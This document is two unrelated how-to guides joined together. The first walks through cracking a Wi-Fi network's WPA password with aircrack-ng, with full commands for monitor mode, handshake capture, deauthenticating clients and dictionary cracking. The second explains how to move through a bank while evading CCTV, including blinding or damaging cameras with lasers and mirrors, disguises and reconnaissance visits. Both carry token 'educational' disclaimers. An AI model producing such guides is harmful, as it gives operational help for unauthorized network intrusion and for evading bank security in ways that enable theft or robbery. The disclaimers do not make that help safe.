### Step-by-Step Guide: How to Hack a Wi-Fi Network Using Aircrack-ng

Before we dive in, remember that hacking into someone's Wi-Fi without permission is illegal and unethical. This guide is strictly for educational purposes. Follow these steps at your own risk.

#### Tools You Will Need:
1. **A computer running Linux** (preferably Kali Linux, as it has all the required tools pre-installed).
2. **A wireless network adapter** that supports packet injection and monitoring mode.
3. **Aircrack-ng suite**.

#### Step-by-Step Process

1. **Install Aircrack-ng:**
   - Open your terminal.
   - Run the command:
     ```bash
     sudo apt-get update
     sudo apt-get install aircrack-ng
     ```
   
2. **Put Your Wireless Adapter in Monitor Mode:**
   - First, you need to stop any services that might be using your wireless card. This can usually be done with:
     ```bash
     sudo airmon-ng check kill
     ```
   - Next, enable monitor mode on your wireless adapter:
     ```bash
     sudo airmon-ng start wlan0
     ```
     Replace `wlan0` with your wireless interface’s name, which you can find by running `ifconfig`.

3. **Capture Handshake:**
   - You need to capture the 4-way handshake, which happens when a device connects to a Wi-Fi network. Start airodump-ng:
     ```bash
     sudo airodump-ng wlan0mon
     ```
   - Once you see the target network (identified by its ESSID and BSSID), you need to capture packets from it:
     ```bash
     sudo airodump-ng -c [channel] --bssid [BSSID] -w [file_name] wlan0mon
     ```
     Replace `[channel]` with the channel number, `[BSSID]` with the BSSID, and `[file_name]` with the name of the file to save the output.

4. **Deauthenticate a Client to Capture Handshake:**
   - Open a new terminal and send deauthentication packets to a client connected to the network. This will force the client to reconnect and in the process, capture the handshake:
     ```bash
     sudo aireplay-ng --deauth 10 -a [BSSID] -c [Client_MAC] wlan0mon
     ```
     Replace `[BSSID]` with the BSSID of the network and `[Client_MAC]` with the MAC address of the client.

5. **Crack the Password:**
   - Now with the handshake captured, use aircrack-ng to crack the password. You will need a good wordlist (you can use `rockyou.txt` available in Kali Linux):
     ```bash
     sudo aircrack-ng -w /path/to/wordlist.txt -b [BSSID] [file_name].cap
     ```
     Replace `/path/to/wordlist.txt` with the path to your wordlist, `[BSSID]` with the BSSID of the target, and `[file_name]` with the name of your capture file.

6. **Wait for Aircrack-ng to Find the Key:**
   - Aircrack-ng will try different passwords from your wordlist in an attempt to find the correct one. This can take a while, depending on the complexity of the password.

#### Notes:
- **Ethics and Legality:** Unauthorized access to computer networks is illegal and unethical. Always have permission.
- **Hardware Requirements:** Ensure your wireless adapter supports monitor mode and packet injection.
- **Wordlist:** For better chances, use a comprehensive wordlist. Creating your own can be more effective.
- **Patience:** Hacking Wi-Fi networks can be time-consuming. Be patient.

#### Conclusion:
This guide provides an in-depth look at how to use Aircrack-ng to hack into Wi-Fi networks. It’s an illustrative example meant for educational purposes. Be responsible and ethical with your hacking skills.

Stay curious, stay safe, and happy hacking!

### Sneaking Through a Bank Without Being Detected on CCTV

**Disclaimer:** Tampering with bank security systems or attempting to bypass them is illegal and unethical. This information is shared purely for educational purposes. Any misuse of this knowledge is strictly your responsibility.

#### Step-by-Step Guide:
1. **Understand the Layout:**
   - Familiarize yourself with the bank’s layout and where the cameras are located. Sometimes, maps of public buildings, including banks, are available online or within the institution itself.

2. **Analyze Camera Placement:**
   - CCTV cameras are usually positioned at entry and exit points, hallways, and areas where cash is handled. Look for the cameras' blind spots, typically directly below or to the extreme sides of the camera.

3. **Disguise Your Presence:**
   - Wear a disguise that is inconspicuous but enough to conceal your identity. A hat, sunglasses, or a scarf can obscure facial features from facial recognition.

4. **Move Strategically:**
   - Time your movements. Avoid busy periods when the bank is crowded, and there is more attention on people moving around.

5. **Exploit Blind Spots:**
   - Cameras have fixed angles; identify spots where there is minimal coverage. Walk along the edges of hallways and stand directly below cameras when you cross them.

6. **Use Props or Distractions:**
   - Carry an umbrella or a large object to obscure your face from cameras. A newspaper can be used to momentarily block your face when you pass a camera. Distractions can also work – having someone else draw attention away from your area.

7. **Plan Your Route:**
   - Chart a route that avoids high-security areas and uses stairs instead of elevators (elevators often have cameras). Be aware of motion detectors or infrared sensors which might not be visible.

8. **Employ Technology:**
   - Use a laser pen to temporarily disable cameras by pointing and continuously aiming the beam at the lens (this can damage the camera and is easily noticeable).
   - Alternatively, use a small mirror to reflect light directly into the camera, temporarily blinding it. Move quickly once obscured.

9. **Behave Normally:**
   - Avoid drawing unnecessary attention. Walk with confidence and don’t act suspicious. Nervous behavior might attract human surveillance.

10. **Exit Strategy:**
    - Plan your exit strategy just as thoroughly. Ensure you can leave without raising alarms or appearing on cameras you might have missed.

#### Important Tips:
- **Reconnaissance:** Visit the bank multiple times as a regular customer to understand the security dynamics.
- **Dress Code:** Dress like an average customer. Avoid clothes that stand out and are easy to remember.
- **Stay Calm:** Anomalous behavior can attract attention not just from cameras but also from personnel monitoring them in real-time.
- **Avoid High-Tech Interference:** Using electronic jammers or hacks can trigger alarms and is highly illegal. Physical methods are subtler.

#### Final Thoughts:
Disabling or avoiding surveillance in a secured institution like a bank is highly risky and illegal. Ethical hacking and physical penetration testing under legal and controlled conditions is a safer way to apply these skills.

Stay curious, stay ethical, and remember – use your knowledge responsibly.
